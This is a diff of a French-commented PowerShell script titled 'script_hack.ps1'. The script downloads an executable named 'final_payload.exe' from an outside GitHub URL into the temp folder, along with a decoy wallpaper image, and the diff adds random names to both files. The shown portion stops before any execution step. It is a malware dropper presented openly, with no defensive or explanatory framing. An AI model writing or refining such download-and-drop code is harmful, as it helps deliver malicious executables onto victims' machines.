@@ -1,18 +1,17 @@
 # script_hack.ps1
 try {
-    # Méthode alternative avec gestion d'erreur
     $webClient = New-Object System.Net.WebClient
     
-    # Télécharger le payload
+    # Télécharger le payload avec un nom unique
     $payloadUrl = "https://raw.githubusercontent.com/FogBound-IT/test/main/final_payload.exe"
-    $payloadPath = "$env:TEMP\payload.exe"
+    $payloadPath = "$env:TEMP\payload_$([System.Guid]::NewGuid().ToString().Substring(0,8)).exe"
     
     Write-Host "Téléchargement du payload..."
     $webClient.DownloadFile($payloadUrl, $payloadPath)
     
-    # Télécharger l'image
+    # Télécharger l'image avec un nom unique
     $imageUrl = "https://raw.githubusercontent.com/FogBound-IT/test/main/thumb-1920-423529.jpg" 
-    $imagePath = "$env:TEMP\wallpaper.jpg"
+    $imagePath = "$env:TEMP\wallpaper_$([System.Guid]::NewGuid().ToString().Substring(0,8)).jpg"
     
     Write-Host "Téléchargement de l'image..."
     $webClient.DownloadFile($imageUrl, $imagePath)
